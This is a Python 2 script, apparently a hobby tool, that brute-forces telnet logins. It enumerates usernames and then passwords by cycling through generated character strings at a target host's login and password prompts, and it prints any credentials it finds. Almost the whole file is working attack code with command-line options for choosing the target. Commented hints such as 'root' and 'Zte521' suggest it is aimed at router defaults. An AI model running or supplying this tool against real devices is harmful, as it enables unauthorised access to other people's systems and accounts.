#!/usr/bin/env python
__author__ = "David Trigo Chavez"
__copyright__ = "Copyright 2016, "
__credits__ = ["David Trigo Chavez"]
__license__ = "GPL"
__version__ = "1.0.1"
__maintainer__ = "David Trigo Chavez"
__email__ = "david.trigo@gmail.com"
__status__ = "Development"

import os, sys, string, telnetlib
from getpass import getpass


class AutoTelnet:
	def __init__(self, host, L_prompt, P_prompt):
		self.host = host
		self.timeout = 2
		self.command_promt = "$ "
		self.passwd = ["",""]
		self.user = ["",""]
		self.telnet = ""
		self.L_prompt = L_prompt
		self.P_prompt = P_prompt
		self.position = 0
		self.counter = 1
		self.actual_random = ""
		self.excepcion = False
		self.user_found = False
		self.pass_found = False
		self.test_counter = 0
		
	def connexion(self):
		self.telnet = telnetlib.Telnet()
		#self.telnet.set_debuglevel(1)
		self.telnet.open(self.host)
		#self.telnet.write("\n")

		

	#http://stackoverflow.com/questions/7133676/generate-alphanumeric-strings-sequentially					
	def generate(self, chars, length, prefix = None):
		if length < 1:
			return
		if not prefix:
			prefix = ''
		for char in chars:
			permutation = prefix + char
			if length == 1:
				yield permutation
			else:
				for sub_permutation in self.generate(chars, length - 1, prefix = permutation):
					yield sub_permutation


	def brute_force(self):

		#User Bruteforce
		for i in range(len(string.lowercase)):
			st = self.generate(string.lowercase,i+1)
			#st = self.generate("rotasdf",4)
			self.connexion()
			self.excepcion = False
			self.test_counter =0
		
			n, match, previous_text = self.telnet.expect([self.L_prompt], 1)
			
			try:
				while self.L_prompt in match.string and not self.excepcion and not self.user_found:
					if self.test_counter >= len(string.lowercase):
						self.connexion()
						self.test_counter = 0
					try:
						self.user[1] = self.user[0]
						self.user[0] = st.next()
						print self.user[1]
						self.telnet.write("%s\n" %self.user[0])
						self.test_counter += 1
						#self.telnet.write("root\n")
						n, match, previous_text = self.telnet.expect([self.L_prompt], 1)
						if n < 0:
							print "User found"
							self.user_found = True
					except:
						print "excepcion"
						self.excepcion = True
			except:
				pass
					
		print self.user[1]
		#pass bruteforce
		self.test_counter = 0	
		#exit()
		for i in range(len(string.letters+string.digits)):
			st = self.generate(string.letters+string.digits,i+1)
			#st = self.generate("Zte521",6)
			self.connexion()
			response = self.telnet.read_until(login_prompt, 1)
			self.telnet.write("%s\n" %self.user[1])
			#self.telnet.write("root\n")
			self.excepcion = False
			
			n, match, previous_text = self.telnet.expect([self.P_prompt], 1)
			#print n
			#print match.string
			#print previous_text
			#
			try:
				while self.P_prompt in match.string and not self.excepcion and not self.pass_found:
                                        if self.test_counter >= len(string.lowercase):
                                                self.connexion()
						response = self.telnet.read_until(login_prompt, 1)
						self.telnet.write("%s\n" %self.user[1])
                                                self.test_counter = 0
					try:
						self.passwd[1] = self.passwd[0]
						self.passwd[0] = st.next()
						print self.passwd[1]
						self.telnet.write("%s\n" %self.passwd[0])
						self.test_counter += 1
						n, match, previous_text = self.telnet.expect([self.P_prompt], 1)
						if n < 0:
							print "Password found"
							self.pass_found = True
					except:
						print "excepcion"
						self.excepcion = True
			except:
				#print "pasando"
				pass

			self.telnet.close()





if __name__ == '__main__':
	basename = os.path.splitext(os.path.basename(sys.argv[0]))[0]
	host = 'localhost'
	login_prompt = "Login: "
	password_prompt = "Password: "
	import getopt
	options = getopt.getopt(sys.argv[1:], 'h:l:p:')
	usage = """
	usage: %s -h host [-l "login: "] [-p "pass: "]
		-h  host  (default: '%s')
		-l  Login prompt (default: '%s')
		-p  Password prompt (default: '%s')

	Example:  %s -h %s
	""" % (basename, host, login_prompt, password_prompt, basename, host)
	# Arg test
	if len(sys.argv) <= 1:
		print usage
		sys.exit(1)
	# Flags
	if len(options[0]) > 0:
		for (opt, optarg) in options[0]:
			if opt == '-h':
				host = optarg
			elif opt == '-l':
				login_prompt = optarg
			elif opt == '-p':
				password_prompt = optarg
	#App
	autoTelnet = AutoTelnet(host, login_prompt, password_prompt)
	#BruteForce
	autoTelnet.brute_force()
	#Found
	print "User: "+autoTelnet.user[1]
	print "Pass: "+autoTelnet.passwd[1]
